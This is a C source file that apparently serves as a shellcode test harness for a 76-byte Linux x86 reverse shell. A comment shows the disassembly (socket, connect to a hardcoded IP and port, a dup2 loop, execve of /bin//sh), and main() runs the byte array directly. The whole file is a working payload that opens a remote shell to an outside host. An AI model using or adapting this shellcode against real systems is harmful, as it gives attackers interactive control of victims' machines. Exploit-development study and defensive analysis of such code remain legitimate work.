/*
Size: 76 bytes

Dump of assembler code for function _start:
=> 0x08048080 <+0>:	xor    eax,eax
   0x08048082 <+2>:	xor    ebx,ebx
   0x08048084 <+4>:	mov    al,0x66
   0x08048086 <+6>:	mov    bl,0x1
   0x08048088 <+8>:	xor    edx,edx
   0x0804808a <+10>:	push   edx
   0x0804808b <+11>:	push   ebx
   0x0804808c <+12>:	push   0x2
   0x0804808e <+14>:	mov    ecx,esp
   0x08048090 <+16>:	int    0x80
   0x08048092 <+18>:	xchg   esi,eax
   0x08048093 <+19>:	mov    al,0x66
   0x08048095 <+21>:	inc    ebx
   0x08048096 <+22>:	push   0x101017f
   0x0804809b <+27>:	pushw  0xfb20
   0x0804809f <+31>:	push   bx
   0x080480a1 <+33>:	mov    ecx,esp
   0x080480a3 <+35>:	push   0x10
   0x080480a5 <+37>:	push   ecx
   0x080480a6 <+38>:	push   esi
   0x080480a7 <+39>:	mov    ecx,esp
   0x080480a9 <+41>:	inc    ebx
   0x080480aa <+42>:	int    0x80
   0x080480ac <+44>:	xchg   esi,ebx
   0x080480ae <+46>:	xor    ecx,ecx
   0x080480b0 <+48>:	mov    cl,0x2
   
Dump of assembler code for function duploop:
=> 0x080480b2 <+0>:	mov    al,0x3f
   0x080480b4 <+2>:	int    0x80
   0x080480b6 <+4>:	dec    ecx
   0x080480b7 <+5>:	jns    0x80480b2 <duploop>
   0x080480b9 <+7>:	mov    al,0xb
   0x080480bb <+9>:	push   edx
   0x080480bc <+10>:	push   0x68732f2f
   0x080480c1 <+15>:	push   0x6e69622f
   0x080480c6 <+20>:	mov    ebx,esp
   0x080480c8 <+22>:	mov    ecx,edx
   0x080480ca <+24>:	int    0x80
*/



#include<stdio.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x68"
"\x0a\x0b\x01\x05"	/*  ip  */
"\x66\x68"
"\x05\x39"		/* port */
"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc9\xb1\x02\xb0\x3f\xcd"
"\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
